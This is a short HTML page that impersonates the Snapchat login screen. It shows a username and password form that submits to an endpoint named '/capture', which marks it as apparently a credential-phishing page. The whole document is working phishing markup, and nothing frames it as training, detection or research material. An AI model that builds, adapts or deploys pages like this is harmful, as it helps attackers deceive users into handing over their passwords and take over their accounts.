<!DOCTYPE html>
<html>
<head><title>Snapchat - Log In</title></head>
<body>
<div style="width:300px;margin:100px auto;">
<h2>Snapchat</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or Email" style="width:100%;padding:8px;margin:5px 0;"><br>
<input type="password" name="password" placeholder="Password" style="width:100%;padding:8px;margin:5px 0;"><br>
<button type="submit" style="width:100%;padding:8px;">Log In</button>
</form>
</div>
</body>
</html>
